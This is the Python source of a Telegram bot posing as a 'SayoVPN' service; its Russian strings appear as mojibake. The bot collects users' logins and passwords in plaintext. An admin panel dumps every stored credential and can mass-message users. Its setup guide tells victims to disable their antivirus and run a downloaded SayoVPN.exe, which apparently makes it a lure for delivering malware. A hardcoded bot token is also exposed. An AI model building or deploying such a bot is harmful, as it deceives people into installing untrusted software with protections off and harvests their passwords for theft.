import telebot
from telebot import types
import sqlite3

# --- ĞĞĞ¡Ğ¢Ğ ĞĞ™ĞšĞ˜ ---
TOKEN = '8416813317:AAGXIVvCv9irjn1uPym2x2hpQP5m-ZcS6yA'
BOT_OWNER_USERNAME = 'pavelian'
DOWNLOAD_LINK = 'https://SayoVPN.replit.app'

bot = telebot.TeleBot(TOKEN, parse_mode='HTML')


# --- Ğ˜ĞĞ˜Ğ¦Ğ˜ĞĞ›Ğ˜Ğ—ĞĞ¦Ğ˜Ğ¯ Ğ‘ĞĞ—Ğ« ---
def init_db():
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS users
                      (
                          id
                          INTEGER
                          PRIMARY
                          KEY,
                          user_id
                          INTEGER
                          UNIQUE,
                          username
                          TEXT,
                          login
                          TEXT,
                          password
                          TEXT,
                          clicked
                          TEXT
                          DEFAULT
                          'ĞĞµÑ‚'
                      )''')

    try:
        cursor.execute("ALTER TABLE users ADD COLUMN clicked TEXT DEFAULT 'ĞĞµÑ‚'")
    except sqlite3.OperationalError:
        pass

    cursor.execute('''CREATE TABLE IF NOT EXISTS admins
                      (
                          user_id
                          INTEGER
                          PRIMARY
                          KEY
                      )''')
    conn.commit()
    conn.close()


init_db()


def is_admin(user_id):
    try:
        user_info = bot.get_chat(user_id)
        if user_info.username and user_info.username.lower() == BOT_OWNER_USERNAME.lower():
            return True
    except:
        pass
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('SELECT user_id FROM admins WHERE user_id = ?', (user_id,))
    res = cursor.fetchone()
    conn.close()
    return res is not None


# --- Ğ“Ğ›ĞĞ’ĞĞĞ• ĞœĞ•ĞĞ® ---
def get_main_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)

    # Ğ¢Ğ•ĞŸĞ•Ğ Ğ¬ Ğ­Ğ¢Ğ ĞŸĞ Ğ¯ĞœĞĞ¯ Ğ¡Ğ¡Ğ«Ğ›ĞšĞ (URL ĞšĞĞĞŸĞšĞ)
    btn_download = types.InlineKeyboardButton("ğŸ“¥ Ğ¡ĞšĞĞ§ĞĞ¢Ğ¬ SAYOVPN", url=DOWNLOAD_LINK)

    btn_inst = types.InlineKeyboardButton("ğŸ’ Ğ˜ĞĞ¡Ğ¢Ğ Ğ£ĞšĞ¦Ğ˜Ğ¯", callback_data='show_guide')
    btn_support = types.InlineKeyboardButton("ğŸš« ĞŸĞĞ”Ğ”Ğ•Ğ Ğ–ĞšĞ [OFF]", callback_data='support_off')
    btn_status = types.InlineKeyboardButton("ğŸ“Š Ğ¡Ğ¢ĞĞ¢Ğ£Ğ¡ Ğ¡Ğ•Ğ Ğ’Ğ•Ğ ĞĞ’", callback_data='show_status')

    markup.add(btn_download)
    markup.add(btn_inst, btn_support)
    markup.add(btn_status)
    return markup


# --- ĞšĞĞœĞĞĞ”Ğ« ---
@bot.message_handler(commands=['start'])
def start(message):
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('SELECT login FROM users WHERE user_id = ?', (message.from_user.id,))
    user = cursor.fetchone()
    conn.close()

    welcome_text = (
            "<b>SayoVPN Premium Service</b> âš¡ï¸\n"
            "â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n"
            "ğŸ›¡ <b>Ğ¡Ñ‚Ğ°Ñ‚ÑƒÑ:</b> " + ("<code>ĞĞ’Ğ¢ĞĞ Ğ˜Ğ—ĞĞ’ĞĞ</code> âœ…" if user else "<code>Ğ“ĞĞ¡Ğ¢Ğ¬</code> ğŸ‘¤") + "\n"
                                                                                                       "ğŸ“¡ <b>Ğ¡ĞµÑ‚ÑŒ:</b> <code>STABLE</code> âœ¨\n"
                                                                                                       "â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€"
    )

    if user:
        bot.send_message(message.chat.id, welcome_text, reply_markup=get_main_menu())
    else:
        bot.send_message(message.chat.id,
                         f"{welcome_text}\n\nğŸ‘‹ <b>Ğ”Ğ¾Ğ±Ñ€Ğ¾ Ğ¿Ğ¾Ğ¶Ğ°Ğ»Ğ¾Ğ²Ğ°Ñ‚ÑŒ!</b>\nĞ’Ğ²ĞµĞ´Ğ¸Ñ‚Ğµ Ğ¶ĞµĞ»Ğ°ĞµĞ¼Ñ‹Ğ¹ <b>Ğ›Ğ¾Ğ³Ğ¸Ğ½</b>:")
        bot.register_next_step_handler(message, process_login)


def process_login(message):
    login = message.text
    bot.send_message(message.chat.id, f"âœ… Ğ›Ğ¾Ğ³Ğ¸Ğ½ <code>{login}</code> ÑĞ¾Ñ…Ñ€Ğ°Ğ½ĞµĞ½.\nĞ¢ĞµĞ¿ĞµÑ€ÑŒ Ğ²Ğ²ĞµĞ´Ğ¸Ñ‚Ğµ <b>ĞŸĞ°Ñ€Ğ¾Ğ»ÑŒ:</b>")
    bot.register_next_step_handler(message, process_password, login)


def process_password(message, login):
    password = message.text
    user_id = message.from_user.id
    raw_username = message.from_user.username or "none"
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('INSERT OR IGNORE INTO users (user_id, username, login, password) VALUES (?, ?, ?, ?)',
                   (user_id, raw_username, login, password))
    conn.commit()
    conn.close()
    bot.send_message(message.chat.id, "âœ¨ <b>Ğ ĞµĞ³Ğ¸ÑÑ‚Ñ€Ğ°Ñ†Ğ¸Ñ Ğ·Ğ°Ğ²ĞµÑ€ÑˆĞµĞ½Ğ°!</b>", reply_markup=get_main_menu())


# --- ĞĞ‘Ğ ĞĞ‘ĞĞ¢ĞšĞ ĞšĞĞĞŸĞĞš ---
@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    if call.data == 'support_off':
        bot.answer_callback_query(call.id, "âŒ ĞŸĞ¾Ğ´Ğ´ĞµÑ€Ğ¶ĞºĞ° Ğ²Ñ€ĞµĞ¼ĞµĞ½Ğ½Ğ¾ Ğ½ĞµĞ´Ğ¾ÑÑ‚ÑƒĞ¿Ğ½Ğ°", show_alert=True)

    elif call.data == 'show_guide':
        text = "ğŸ“– <b>Ğ Ğ£ĞšĞĞ’ĞĞ”Ğ¡Ğ¢Ğ’Ğ SAYOVPN</b>\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n1. <b>ĞĞ¢ĞšĞ›Ğ®Ğ§Ğ˜Ğ¢Ğ• ĞĞĞ¢Ğ˜Ğ’Ğ˜Ğ Ğ£Ğ¡.</b>\n2. ĞĞ°Ğ¶Ğ¼Ğ¸Ñ‚Ğµ Ğ¡ĞšĞĞ§ĞĞ¢Ğ¬.\n3. Ğ—Ğ°Ğ¿ÑƒÑÑ‚Ğ¸Ñ‚Ğµ SayoVPN.exe.\n4. Ğ˜ÑĞ¿Ğ¾Ğ»ÑŒĞ·ÑƒĞ¹Ñ‚Ğµ ÑĞ²Ğ¾Ğ¸ Ğ´Ğ°Ğ½Ğ½Ñ‹Ğµ Ğ´Ğ»Ñ Ğ²Ñ…Ğ¾Ğ´Ğ°."
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("â¬…ï¸ ĞĞĞ—ĞĞ”", callback_data='back_to_menu'))
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup)

    elif call.data == 'show_status':
        text = "ğŸŒ <b>Ğ¡Ğ¢ĞĞ¢Ğ£Ğ¡ Ğ¡Ğ•Ğ Ğ’Ğ•Ğ ĞĞ’</b>\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\nRU-MSK: ğŸŸ¢ ONLINE\nNL-AMS: ğŸŸ¢ ONLINE"
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("â¬…ï¸ ĞĞĞ—ĞĞ”", callback_data='back_to_menu'))
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup)

    elif call.data == 'back_to_menu':
        bot.edit_message_text("<b>Ğ“Ğ»Ğ°Ğ²Ğ½Ğ¾Ğµ Ğ¼ĞµĞ½Ñ SayoVPN</b> âš¡ï¸", call.message.chat.id, call.message.message_id,
                              reply_markup=get_main_menu())

    elif call.data.startswith('adm_'):
        admin_logic(call)


# --- ĞĞ”ĞœĞ˜Ğ ĞŸĞĞĞ•Ğ›Ğ¬ ---
@bot.message_handler(commands=['admin'])
def open_admin(message):
    if not is_admin(message.from_user.id): return

    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('SELECT COUNT(*) FROM users')
    total_users = cursor.fetchone()[0]
    conn.close()

    stats = (
        "ğŸ›  <b>CONTROL PANEL</b>\n"
        "â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n"
        f"ğŸ‘¥ Ğ’ÑĞµĞ³Ğ¾ ÑĞ·ĞµÑ€Ğ¾Ğ²: <code>{total_users}</code>\n"
        "â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€"
    )

    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("ğŸ“‹ Ğ¡Ğ¿Ğ¸ÑĞ¾Ğº Ğ¿Ğ¾Ğ»ÑŒĞ·Ğ¾Ğ²Ğ°Ñ‚ĞµĞ»ĞµĞ¹", callback_data='adm_list'),
        types.InlineKeyboardButton("ğŸ“¢ Ğ¡Ğ´ĞµĞ»Ğ°Ñ‚ÑŒ Ñ€Ğ°ÑÑÑ‹Ğ»ĞºÑƒ", callback_data='adm_broadcast'),
        types.InlineKeyboardButton("âŒ Ğ£Ğ´Ğ°Ğ»Ğ¸Ñ‚ÑŒ Ğ¿Ğ¾Ğ»ÑŒĞ·Ğ¾Ğ²Ğ°Ñ‚ĞµĞ»Ñ", callback_data='adm_delete')
    )
    bot.send_message(message.chat.id, stats, reply_markup=markup)


def admin_logic(call):
    if call.data == 'adm_list':
        conn = sqlite3.connect('bot_database.db')
        cursor = conn.cursor()
        cursor.execute('SELECT user_id, username, login, password FROM users')
        users = cursor.fetchall()
        conn.close()

        text = "ğŸ“‹ <b>Ğ‘ĞĞ—Ğ ĞŸĞĞ›Ğ¬Ğ—ĞĞ’ĞĞ¢Ğ•Ğ›Ğ•Ğ™:</b>\n\n"
        for u in users:
            text += f"ğŸ‘¤ @{u[1]} | ID: <code>{u[0]}</code>\nâ”£ <b>L:</b> <code>{u[2]}</code> | <b>P:</b> <code>{u[3]}</code>\n\n"

        if not users: text = "Ğ‘Ğ°Ğ·Ğ° Ğ¿ÑƒÑÑ‚Ğ°."
        bot.send_message(call.message.chat.id, text)

    elif call.data == 'adm_broadcast':
        msg = bot.send_message(call.message.chat.id, "ğŸ“ Ğ’Ğ²ĞµĞ´Ğ¸Ñ‚Ğµ Ñ‚ĞµĞºÑÑ‚ Ñ€Ğ°ÑÑÑ‹Ğ»ĞºĞ¸:")
        bot.register_next_step_handler(msg, run_broadcast)

    elif call.data == 'adm_delete':
        msg = bot.send_message(call.message.chat.id, "âš ï¸ Ğ’Ğ²ĞµĞ´Ğ¸Ñ‚Ğµ <b>Telegram ID</b> Ğ¿Ğ¾Ğ»ÑŒĞ·Ğ¾Ğ²Ğ°Ñ‚ĞµĞ»Ñ Ğ´Ğ»Ñ ÑƒĞ´Ğ°Ğ»ĞµĞ½Ğ¸Ñ:")
        bot.register_next_step_handler(msg, process_delete_user)


def run_broadcast(message):
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('SELECT user_id FROM users')
    ids = cursor.fetchall()
    conn.close()
    for i in ids:
        try:
            bot.send_message(i[0], message.text)
        except:
            pass
    bot.send_message(message.chat.id, "âœ… Ğ Ğ°ÑÑÑ‹Ğ»ĞºĞ° Ğ·Ğ°Ğ²ĞµÑ€ÑˆĞµĞ½Ğ°.")


def process_delete_user(message):
    target_id = message.text
    if not target_id.isdigit():
        bot.send_message(message.chat.id, "âŒ ĞÑˆĞ¸Ğ±ĞºĞ°! ĞÑƒĞ¶ĞµĞ½ Ñ†Ğ¸Ñ„Ñ€Ğ¾Ğ²Ğ¾Ğ¹ ID.")
        return

    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('DELETE FROM users WHERE user_id = ?', (target_id,))

    if cursor.rowcount > 0:
        bot.send_message(message.chat.id,
                         f"âœ… ĞŸĞ¾Ğ»ÑŒĞ·Ğ¾Ğ²Ğ°Ñ‚ĞµĞ»ÑŒ <code>{target_id}</code> ÑƒĞ´Ğ°Ğ»ĞµĞ½. ĞŸÑ€Ğ¸ ÑĞ»ĞµĞ´ÑƒÑÑ‰ĞµĞ¼ Ğ²Ñ…Ğ¾Ğ´Ğµ ĞµĞ¼Ñƒ Ğ¿Ğ¾Ñ‚Ñ€ĞµĞ±ÑƒĞµÑ‚ÑÑ Ñ€ĞµĞ³Ğ¸ÑÑ‚Ñ€Ğ°Ñ†Ğ¸Ñ.")
    else:
        bot.send_message(message.chat.id, "â“ ID Ğ½Ğµ Ğ½Ğ°Ğ¹Ğ´ĞµĞ½.")

    conn.commit()
    conn.close()


if __name__ == '__main__':
    bot.infinity_polling(timeout=90)